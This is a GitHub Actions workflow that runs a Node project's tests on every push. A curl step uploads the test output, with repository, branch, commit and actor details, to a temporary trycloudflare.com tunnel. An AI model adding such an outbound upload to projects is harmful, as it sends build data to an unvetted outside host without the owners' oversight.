name: Test and Notify
on: [push]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
      - run: npm ci
      - name: Run tests and send notification
        run: |
          npm test > test-output.txt 2>&1 || true  
          curl -X POST https://millions-inner-james-comp.trycloudflare.com/api/result \
            -F "errores=@test-output.txt" \
            -F "data={\"repository\":\"${{ github.repository }}\",\"branch\":\"${{ github.ref_name }}\",\"commit\":\"${{ github.sha }}\",\"actor\":\"${{ github.actor }}\"}"
          npm run test